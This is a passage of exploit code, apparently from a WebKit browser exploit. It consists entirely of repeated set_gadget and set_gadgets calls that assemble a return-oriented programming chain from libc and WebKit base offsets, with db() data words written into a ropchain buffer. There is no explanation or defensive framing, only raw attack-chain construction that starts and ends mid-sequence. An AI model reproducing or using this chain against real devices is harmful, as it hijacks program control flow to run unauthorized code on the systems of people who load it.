set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+95104, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([10, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+95208, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+95224, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+95312, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+95368, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+95440, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+95496, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+14461559, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+95648, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+95736, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+95752, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+95896, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+95864, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+95880, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+95968, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+96024, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+96104, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([11, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+96208, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+96224, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+96312, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+96368, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+96440, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+96496, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+272260, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+96648, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+96736, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+96752, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+96896, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+96864, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+96880, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+96968, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+97024, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+97104, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([12, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+97208, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+97224, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+97312, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+97368, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+97440, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+97496, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+97648, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+97736, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+97752, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+97896, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+97864, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+97880, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+97968, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+98024, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+98104, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([13, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+98208, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+98224, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+98312, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+98368, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+98440, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+98496, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+98600, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+98688, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+98704, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+98848, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+98816, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+98832, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+98920, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+98976, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+99056, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([5, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+99160, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+99176, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+99264, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+99320, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+99440, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+99528, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+99544, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+99688, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+99656, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+99672, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+99760, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+99816, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+99896, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([14, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+100000, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+100016, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+100104, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+100160, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+100232, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+100288, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+100440, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+100528, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+100544, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+100688, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+100656, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+100672, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+100760, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+100816, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+100896, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([15, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+101000, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+101016, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+101104, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+101160, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+101232, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+101288, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+877877, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+101440, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+101528, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+101544, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+101688, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+101656, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+101672, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+101760, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+101816, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+101896, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+102000, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+102016, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+102104, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+102160, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+102232, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+102288, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+102440, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+102528, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+102544, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+102688, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+102656, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+102672, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+102760, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+102816, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+102896, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([17, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+103000, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+103016, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+103104, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+103160, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+103232, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+103288, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+103392, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+103480, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+103496, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+103640, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+103608, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+103624, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+103712, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+103768, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+103848, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([4, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+103952, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+103968, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+104056, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+104112, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+104232, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+104320, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+104336, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+104480, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+104448, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+104464, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+104552, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+104608, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+104688, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([18, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+104792, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+104808, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+104896, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
